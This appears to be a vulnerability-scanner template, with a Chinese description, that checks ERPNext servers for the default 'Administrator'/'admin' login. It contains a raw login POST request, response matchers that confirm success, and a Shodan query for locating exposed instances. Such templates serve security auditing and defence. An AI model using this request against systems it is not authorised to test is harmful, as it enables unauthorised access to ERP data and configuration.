id: erpnext-default-login

info:
  name: ERPNext 默认口令登录（弱口令）
  author: 0x_Akoko
  severity: high
  description: |
    该模板通过尝试 ERPNext 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://github.com/frappe/erpnext
    - https://github.com/frappe/erpnext/blob/develop/README.md
  metadata:
    verified: true
    max-request: 1
    vendor: frappe
    product: erpnext
    shodan-query: html:"Login to Frappe"
  tags: erpnext,erp,default-login,vuln

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        cmd=login&usr={{username}}&pwd={{password}}&device=desktop

    attack: pitchfork
    payloads:
      username:
        - Administrator
      password:
        - admin

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "Logged In", "home_page", "Administrator")'
          - 'contains_all(set_cookie, "sid=", "system_user=yes")'
        condition: and
